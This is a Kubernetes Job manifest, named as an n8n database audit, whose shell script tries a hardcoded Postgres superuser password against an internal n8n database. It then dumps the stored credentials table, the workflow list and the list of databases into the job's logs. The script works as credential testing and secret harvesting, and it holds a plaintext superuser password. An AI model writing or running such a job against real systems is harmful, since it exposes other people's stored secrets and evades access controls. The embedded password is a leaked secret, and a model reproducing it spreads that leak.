apiVersion: batch/v1
kind: Job
metadata:
  name: n8n-db-audit-v2
  namespace: default
spec:
  ttlSecondsAfterFinished: 86400
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: alpine:latest
        command:
        - /bin/sh
        - -c
        - |
          apk add -q postgresql-client 2>/dev/null
          echo "=== TEST CONNECTIONS ==="
          # Try postgres superuser on n8n DB
          PGPASSWORD=wpEJl3WKOImARD9WgBsa psql -h 172.16.10.14 -p 6432 -U postgres -d n8n -c "\conninfo" 2>&1 && echo "postgres/wpEJl3 OK" || echo "postgres/wpEJl3 FAIL"
          PGPASSWORD=wpEJl3WKOImARD9WgBsa psql -h 172.16.10.14 -p 6432 -U postgres -d n8n -c "SELECT id, name, type, data FROM credentials ORDER BY id;" 2>&1
          echo "=== WORKFLOWS ==="
          PGPASSWORD=wpEJl3WKOImARD9WgBsa psql -h 172.16.10.14 -p 6432 -U postgres -d n8n -c "SELECT id, name, active FROM workflow_entity ORDER BY id;" 2>&1
          echo "=== ALL DBs ==="
          PGPASSWORD=wpEJl3WKOImARD9WgBsa psql -h 172.16.10.14 -p 6432 -U postgres -c "\l" 2>&1